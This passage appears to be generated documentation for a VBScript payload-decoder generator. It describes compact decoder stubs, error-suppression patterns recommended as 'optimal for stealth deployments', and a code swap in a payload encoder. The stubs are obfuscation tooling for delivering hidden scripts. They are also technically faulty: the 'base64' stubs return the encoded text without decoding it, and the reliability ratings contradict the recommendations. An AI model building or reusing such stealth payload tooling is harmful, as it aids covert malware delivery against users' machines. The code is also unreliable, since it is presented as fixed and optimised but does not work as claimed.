  # Returns str or None

VBS DECODER VARIANTS
─────────────────────────────────────────────────────────────────────────────

Ultra Compact (90 bytes) - SMALLEST
  OptimizedVBSDecoderGenerator.create_ultra_compact_decoder(payload, var)
  • Minimal error handling
  • No resource cleanup
  • Best for: extreme size constraints
  • Reliability: 3/10 (assumes valid MSXML2)

  Generated VBS:
    On Error Resume Next
    Set x=CreateObject("MSXML2.DOMDocument")
    x.LoadXML"<u><![CDATA[...]]></u>"
    p=x.DocumentElement.text

Compact (120 bytes) - RECOMMENDED ★
  OptimizedVBSDecoderGenerator.create_compact_base64_decoder(payload, var)
  • Balanced size and reliability
  • Proper resource cleanup
  • Inline error handling
  • Best for: production deployments
  • Reliability: 4/10

  Generated VBS:
    On Error Resume Next
    Dim x,d:Set x=CreateObject("MSXML2.DOMDocument")
    x.LoadXML"<u><![CDATA[...]]></u>"
    p=x.DocumentElement.text
    Set x=Nothing

Error Resilient (180 bytes) - SAFEST
  OptimizedVBSDecoderGenerator.create_error_resilient_decoder(payload, var)
  • Maximum reliability
  • Fallback on MSXML2 missing
  • Full error handling
  • Best for: untrusted environments
  • Reliability: 9/10

  Generated VBS:
    On Error Resume Next
    Dim x,p
    Set x=CreateObject("MSXML2.DOMDocument")
    If Not x Is Nothing Then
        x.LoadXML"<u><![CDATA[...]]></u>"
        p=x.DocumentElement.text
        Set x=Nothing
    Else
        p=""
    End If

Fast Hex Decoder (200 bytes) - ALTERNATIVE
  OptimizedVBSDecoderGenerator.create_fast_hex_decoder(hex_payload, var)
  • When MSXML2 unavailable
  • Alternative encoding
  • Manual byte-by-byte conversion

  Generated VBS:
    On Error Resume Next
    Dim h,i,r
    h="48656c6c6f..."
    For i=1 To Len(h) Step 2
        r=r&Chr(CLng("&H"&Mid(h,i,2)))
    Next
    p=r


ERROR HANDLING PATTERNS
─────────────────────────────────────────────────────────────────────────────

Python Error Handling:

  Pattern 1 - Silent Fail:
    result = OptimizedBase64Decoder.decode_fast(data)
    if result is None:
        handle_error()

  Pattern 2 - Default Value:
    result = OptimizedBase64Decoder.decode_or_default(data, default=b"")

  Pattern 3 - Tuple Return:
    success, result = OptimizedBase64Decoder.validate_and_decode(data)
    if not success:
        handle_error()

  Pattern 4 - String with Fallback:
    text = OptimizedBase64Decoder.decode_string_or(data, default="")

VBS Error Handling:

  All generated VBS starts with: On Error Resume Next
  • Suppresses error popups
  • Continues silently on failure
  • Optimal for stealth deployments


INTEGRATION WITH EXISTING CODE
─────────────────────────────────────────────────────────────────────────────

Replace vbs_encoder.py create_base64_decoder_vbs():

  OLD (BROKEN):
    def create_base64_decoder_vbs(self, payload: str, output_var: str = "p"):
        encoded, var_name = self.encode_string_base64(payload)
        obj_var = self._generate_random_name("o_")
        vbs_code = f"""
Dim {var_name}, {output_var}
{var_name} = "{encoded}"
Set {obj_var} = CreateObject("MSXML2.DOMDocument")
With {obj_var}
    .LoadXML "<u><![CDATA[" & {var_name} & "]]></u>"
    {output_var} = .SelectSingleNode("u").text
End With
"""
        return vbs_code.strip()

  NEW (OPTIMIZED):
    from optimized_base64_decoder import OptimizedVBSDecoderGenerator

    def create_base64_decoder_vbs(self, payload: str, output_var: str = "p"):
        encoded = base64.b64encode(payload.encode()).decode()
        return OptimizedVBSDecoderGenerator.create_compact_base64_decoder(
            encoded, output_var
        )

  Benefits:
    • 57% smaller (120 vs 280 bytes)
    • Inline error handling
    • Proper resource cleanup
    • Bug fixes included
